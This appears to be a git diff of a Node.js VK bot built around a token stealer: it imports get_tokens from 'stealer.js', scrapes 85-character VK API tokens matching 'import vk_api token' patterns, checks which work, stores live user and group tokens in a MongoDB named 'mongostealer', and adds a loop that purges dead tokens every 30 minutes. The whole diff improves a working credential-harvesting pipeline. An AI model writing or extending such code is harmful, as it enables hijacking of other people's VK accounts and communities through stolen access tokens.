@@ -2,9 +2,9 @@ const { VK, Keyboard } = require('vk-io');
 const { HearManager } = require('@vk-io/hear');
 const MongoClient = require("mongodb").MongoClient;
 
-const { db_get_collection, db_get_random, db_add, db_delete_collection } = require("./db.js")
+const { db_get_collection, db_get_random, db_add, db_delete_collection, db_available_value, db_delete_value } = require("./db.js")
 const { get_vk_messages } = require('./vk_handler.js')
-const { vk_checker } = require("./vk_checker.js");
+const { vk_checker, valid_token } = require("./vk_checker.js");
 const { get_tokens } = require("./stealer.js");
 
 const uri = process.env.mongostealer;
@@ -129,25 +129,21 @@ client.connect(async function(err, client) {
 
     async function dbupdate() {
         while (true) {
-            
             let new_tokens = await get_tokens('import vk_api token', /token ?= ?['"]([a-zA-Z0-9]{85})['"]/);
-            let db_users = await db_get_collection(users)
-            let db_groups = await db_get_collection(groups)
-            let db_checks = db_users.concat(db_groups);
-            let db_tokens = await Promise.all(db_checks.map(check => check.token)); //чеки в токены
-            let all_tokens = unique(db_tokens.concat(new_tokens));
-            let all_checks = await vk_checker(all_tokens);
+            let new_checks = await vk_checker(new_tokens);
 
-            db_delete_collection(users)
-            db_delete_collection(groups)
-
-            await Promise.all(all_checks.map((check) => {
+            await Promise.all(new_checks.map(async (check) => {
                 switch (check.type) {
                     case "user":
-                        db_add(users, check)
-                        break 
+                        if (await db_available_value(users, { token: check.token })) {
+                            db_add(users, check)
+                        }
+                        break
                     case "group":
-                        db_add(groups, check)
+                        if ( await db_available_value(groups, { token: check.token })) {
+                            db_add(groups, check)
+                        }
+                        break
                 }
             }))
 
@@ -156,6 +152,31 @@ client.connect(async function(err, client) {
         };
     };
 
+    async function dbclear() {
+        while (true) {
+            let db_users = await db_get_collection(users)
+            let db_groups = await db_get_collection(groups)
+
+            let user_check = db_users.map(async (check) => {
+                if (!await valid_token(check.token)) {
+                    console.log("del")
+                    db_delete_value(users, { "_id": check._id })
+                }
+            })
+            let group_check = db_groups.map(async (check) => {
+                if (!await valid_token(check.token)) {
+                    console.log("del")
+                    db_delete_value(groups, { "_id": check._id })
+                }
+            })
+
+            await Promise.all([user_check, group_check]);
+            console.log("cleared db")
+            await new Promise(resolve => setTimeout(resolve, 30 * 60 * 1000)); //спим 30 мин
+        };
+    };
+    
+    dbclear();
     dbupdate();
     vk.updates.start().catch(console.error);
 });
